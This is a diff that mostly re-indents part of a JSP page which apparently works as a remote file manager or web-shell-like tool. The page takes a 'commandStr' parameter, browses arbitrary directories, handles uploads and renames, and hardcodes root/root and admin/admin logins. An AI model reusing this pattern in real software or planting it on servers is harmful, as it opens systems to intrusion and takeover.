@@ -193,35 +193,34 @@
 </head>
 <body>
 <%
-request.getCookies();
-request.setCharacterEncoding ("utf-8");
-response.setCharacterEncoding ("utf-8");
-response.setContentType("text/html;charset=utf-8");
-req=request;
-res=response;
-o =res.getWriter();
-url=request.getRequestURI().split("/")[2];
-action=request.getParameter("action");
-oldname=request.getParameter("oldName");
-newname=request.getParameter("newName");
-dir=request.getParameter("dir");
-System.out.println((String)application.getAttribute("dir"));
-msg=dir=dir==null?(String)application.getAttribute("dir"):decode(dir);
-if(dir!=null){application.setAttribute("dir", decode(dir));}else{dir="C:\\";}
-action=action==null?"list":action;
-HashMap<String, String> user = new HashMap<>();
-String cmdStr=request.getParameter("commandStr");
-//设置账号密码
-user.put("root", "root");
-user.put("admin", "admin");
-String username = req.getParameter("username");
-String password = req.getParameter("password");
-if(newname!=null){
- 	msg=rename(newname,oldname);   
-}else if(request.getContentLengthLong()>180){
-	load(request,response);
-}
-  Cookie[] cookie = req.getCookies();
+	request.setCharacterEncoding ("utf-8");
+	response.setCharacterEncoding ("utf-8");
+	response.setContentType("text/html;charset=utf-8");
+	req=request;
+	res=response;  
+	o =res.getWriter();
+	url=request.getRequestURI().split("/")[2];
+	action=request.getParameter("action");
+	oldname=request.getParameter("oldName");
+	newname=request.getParameter("newName");
+	dir=request.getParameter("dir");
+	System.out.println((String)application.getAttribute("dir"));
+	msg=dir=dir==null?(String)application.getAttribute("dir"):decode(dir);
+	if(dir!=null){application.setAttribute("dir", decode(dir));}else{dir="C:\\";}
+	action=action==null?"list":action;
+	HashMap<String, String> user = new HashMap<>();
+	String cmdStr=request.getParameter("commandStr");
+	//设置账号密码
+	user.put("root", "root");
+	user.put("admin", "admin");
+	String username = req.getParameter("username");
+	String password = req.getParameter("password");
+	if(newname!=null){
+	 	msg=rename(newname,oldname);   
+	}else if(request.getContentLengthLong()>180){
+		load(request,response);
+	}
+            Cookie[] cookie = req.getCookies();
 		boolean red = false;
 		if(cookie!=null){
 			for (Cookie co : cookie) {
